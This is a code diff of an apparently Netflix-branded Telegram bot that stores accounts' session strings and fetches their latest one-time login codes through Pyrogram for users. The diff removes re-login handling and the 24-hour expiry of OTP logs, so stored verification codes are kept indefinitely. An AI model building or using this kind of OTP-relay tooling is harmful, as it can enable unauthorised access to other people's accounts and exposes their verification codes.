-        # Add back button with page context
-        if user_id in pagination_states:
-            page = pagination_states[user_id]["page"]
-            markup.add(InlineKeyboardButton("⬅️ Back to List", callback_data=f"view_accounts_{page}"))
-        else:
-            markup.add(InlineKeyboardButton("⬅️ Back to List", callback_data="view_accounts_1"))
+        markup.add(InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"))
+        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="view_accounts"))
         
         phone_display = format_phone(account["phone"])
         has_2fa = "✅ Enabled" if account.get("has_2fa") else "❌ Disabled"
-        status = "✅ Active" if account.get("status") == "active" else "❌ Invalid"
         
         account_text = f"""
 <b>📱 Account Details</b>
 
 <b>Phone:</b> <code>{phone_display}</code>
 <b>2FA:</b> {has_2fa}
-<b>Status:</b> {status}
 <b>Added:</b> {account.get('created_at', datetime.utcnow()).strftime('%d %b %Y')}
 
-Choose an action:
+Click below to get OTP:
 """
         
-        send_or_edit_message(
+        smart_edit_or_send(
             call.message.chat.id,
             user_id,
+            "account_details",
             account_text,
             markup=markup,
             photo_url=NETFLIX_MAIN_IMAGE
@@ -1227,167 +1230,6 @@ Choose an action:
     except Exception as e:
         logger.error(f"Account selection error: {e}")
         bot.answer_callback_query(call.id, "Error loading account", show_alert=True)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("relogin_"))
-def handle_relogin_account(call):
-    """Re-login an existing account"""
-    user_id = call.from_user.id
-    
-    if not is_admin(user_id):
-        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
-        return
-    
-    account_id = call.data.replace("relogin_", "")
-    
-    try:
-        # Get account
-        account = accounts_col.find_one({"_id": ObjectId(account_id)})
-        
-        if not account:
-            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
-            return
-        
-        # Set state for re-login
-        login_states[user_id] = {
-            "step": "ask_phone",
-            "user_type": "admin",
-            "relogin_account_id": account_id,
-            "existing_phone": account["phone"]
-        }
-        
-        # Show phone input with existing phone pre-filled
-        login_text = f"""
-<b>🔄 Re-login Account</b>
-
-Phone number: <code>{account['phone']}</code>
-
-This will update the session for this account.
-
-Click below to start re-login process:
-"""
-        
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔄 Start Re-login", callback_data="start_relogin"))
-        markup.add(InlineKeyboardButton("❌ Cancel", callback_data=f"account_{account_id}"))
-        
-        send_or_edit_message(
-            call.message.chat.id,
-            user_id,
-            login_text,
-            markup=markup,
-            photo_url=NETFLIX_MAIN_IMAGE
-        )
-        
-    except Exception as e:
-        logger.error(f"Re-login error: {e}")
-        bot.answer_callback_query(call.id, "Error starting re-login", show_alert=True)
-
-@bot.callback_query_handler(func=lambda call: call.data == "start_relogin")
-def handle_start_relogin(call):
-    """Start the re-login process"""
-    user_id = call.from_user.id
-    
-    state = login_states.get(user_id)
-    if not state or "existing_phone" not in state:
-        bot.answer_callback_query(call.id, "Session expired", show_alert=True)
-        return
-    
-    # Use existing phone number
-    phone = state["existing_phone"]
-    
-    # Send OTP
-    sending_text = """
-<b>⏳ Sending OTP...</b>
-
-<i>Please wait while we send verification code to the phone number.</i>
-"""
-    
-    send_or_edit_message(
-        call.message.chat.id,
-        user_id,
-        sending_text,
-        photo_url=NETFLIX_MAIN_IMAGE
-    )
-    
-    try:
-        result = account_manager.send_otp(phone)
-        
-        if not result.get("success"):
-            error_msg = result.get("error", "Unknown error")
-            
-            error_text = f"""
-<b>❌ Failed to send OTP</b>
-
-{error_msg}
-
-Click below to try again:
-"""
-            
-            markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("🔄 Try Again", callback_data="start_relogin"))
-            markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin"))
-            
-            send_or_edit_message(
-                call.message.chat.id,
-                user_id,
-                error_text,
-                markup=markup,
-                photo_url=NETFLIX_MAIN_IMAGE
-            )
-            return
-        
-        # Update state for OTP input
-        login_states[user_id] = {
-            "step": "ask_otp",
-            "phone": phone,
-            "phone_code_hash": result["phone_code_hash"],
-            "session_key": result["session_key"],
-            "user_type": "admin",
-            "relogin_account_id": state.get("relogin_account_id")
-        }
-        
-        otp_text = f"""
-<b>✅ OTP Sent Successfully</b>
-
-Phone: <code>{phone}</code>
-
-Enter the 5-digit OTP code received on Telegram:
-"""
-        
-        markup = InlineKeyboardMarkup().add(
-            InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
-        )
-        
-        send_or_edit_message(
-            call.message.chat.id,
-            user_id,
-            otp_text,
-            markup=markup,
-            photo_url=NETFLIX_MAIN_IMAGE
-        )
-        
-    except Exception as e:
-        logger.error(f"Send OTP error: {e}")
-        
-        error_text = f"""
-<b>❌ Connection Error</b>
-
-Failed to send verification code.
-
-Error: {str(e)}
-
-Start again with /start
-"""
-        
-        send_or_edit_message(
-            call.message.chat.id,
-            user_id,
-            error_text,
-            photo_url=NETFLIX_MAIN_IMAGE
-        )
-        
-        if user_id in login_states:
-            del login_states[user_id]
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("get_otp_"))
 def handle_get_otp(call):
@@ -1401,34 +1243,29 @@ def handle_get_otp(call):
     account_id = call.data.replace("get_otp_", "")
     
     try:
-        # Get account
         account = accounts_col.find_one({"_id": ObjectId(account_id)})
-        
         if not account:
             bot.answer_callback_query(call.id, "Account not found", show_alert=True)
-            return
-        
-        session_string = account.get("session_string", "")
-        if not session_string:
-            bot.answer_callback_query(call.id, "No session available", show_alert=True)
+            handle_view_accounts(call)
             return
         
         bot.answer_callback_query(call.id, "⏳ Fetching OTP...")
         
         # Fetch OTP using Pyrogram
         otp = account_manager.get_latest_otp(
-            session_string,
+            account["session_string"],
             account["phone"]
         )
         
         if not otp:
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
-            markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
+            markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
             
-            send_or_edit_message(
+            smart_edit_or_send(
                 call.message.chat.id,
                 user_id,
+                "otp_result",
                 f"<b>📱 No OTP Found</b>\n\n"
                 f"Phone: <code>{format_phone(account['phone'])}</code>\n\n"
                 f"No OTP found in recent messages.",
@@ -1450,14 +1287,15 @@ def handle_get_otp(call):
         
         message += f"<b>Fetched:</b> {datetime.utcnow().strftime('%H:%M:%S')}\n"
         
-        # Create buttons
+        # Create buttons - ONLY Get OTP Again and Back
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
-        markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
+        markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
         
-        send_or_edit_message(
+        smart_edit_or_send(
             call.message.chat.id,
             user_id,
+            "otp_result",
             message,
             markup=markup,
             photo_url=NETFLIX_MAIN_IMAGE
@@ -1465,37 +1303,24 @@ def handle_get_otp(call):
         
     except Exception as e:
         logger.error(f"Get OTP error: {e}")
-        bot.answer_callback_query(call.id, f"Session expired. Please re-login.", show_alert=True)
-        
-        # Mark account as invalid
-        accounts_col.update_one(
-            {"_id": ObjectId(account_id)},
-            {"$set": {"status": "invalid"}}
-        )
+        bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)
 
 @bot.callback_query_handler(func=lambda call: call.data == "otp_logs")
 def handle_otp_logs(call):
-    """Show OTP logs from last 24 hours (admin only)"""
+    """Show OTP logs (admin only)"""
     user_id = call.from_user.id
     
     if not is_admin(user_id):
         bot.answer_callback_query(call.id, "Admin only", show_alert=True)
         return
     
-    # Cleanup old logs first
-    cleanup_old_logs()
-    
-    # Get OTP logs from last 24 hours
-    cutoff_time = datetime.utcnow() - timedelta(hours=24)
-    logs = list(otp_logs_col.find(
-        {"fetched_at": {"$gte": cutoff_time}},
-        {"phone": 1, "otp": 1, "fetched_at": 1}
-    ).sort("fetched_at", -1).limit(20))
+    # Get recent OTP logs
+    logs = list(otp_logs_col.find({}, {"phone": 1, "otp": 1, "fetched_at": 1}).sort("fetched_at", -1).limit(10))
     
     if not logs:
-        logs_text = "<b>📊 OTP Logs (Last 24 Hours)</b>\n\nNo OTP logs found in the last 24 hours."
+        logs_text = "<b>📊 OTP Logs</b>\n\nNo OTP logs found yet."
     else:
-        logs_text = "<b>📊 OTP Logs (Last 24 Hours)</b>\n\n"
+        logs_text = "<b>📊 Recent OTP Logs</b>\n\n"
         for idx, log in enumerate(logs, 1):
             phone = format_phone(log.get("phone", "N/A"))
             otp = log.get("otp", "N/A")
@@ -1505,9 +1330,10 @@ def handle_otp_logs(call):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
     
-    send_or_edit_message(
+    smart_edit_or_send(
         call.message.chat.id,
         user_id,
+        "otp_logs",
         logs_text,
         markup=markup,
         photo_url=NETFLIX_MAIN_IMAGE
@@ -1521,8 +1347,6 @@ def handle_back_to_welcome(call):
     # Clear any states
     if user_id in login_states:
         del login_states[user_id]
-    if user_id in pagination_states:
-        del pagination_states[user_id]
     
     show_netflix_welcome(user_id, call.message.chat.id)
 
@@ -1537,12 +1361,6 @@ def handle_other_messages(message):
     
     # Ensure user exists
     ensure_user_exists(user_id, message.from_user.first_name, message.from_user.username)
-    
-    # Clear states
-    if user_id in login_states:
-        del login_states[user_id]
-    if user_id in pagination_states:
-        del pagination_states[user_id]
     
     # Show appropriate menu
     if is_admin(user_id):
@@ -1563,9 +1381,8 @@ if __name__ == "__main__":
     try:
         accounts_col.create_index([("phone", 1)], unique=True)
         accounts_col.create_index([("created_at", -1)])
-        accounts_col.create_index([("session_string", 1)])
-        accounts_col.create_index([("status", 1)])
-        otp_logs_col.create_index([("fetched_at", -1)], expireAfterSeconds=86400)  # Auto delete after 24h
+        accounts_col.create_index([("added_by", 1)])
+        otp_logs_col.create_index([("fetched_at", -1)])
         users_col.create_index([("user_id", 1)], unique=True)
         users_col.create_index([("created_at", -1)])
         logger.info("✅ Database indexes created")
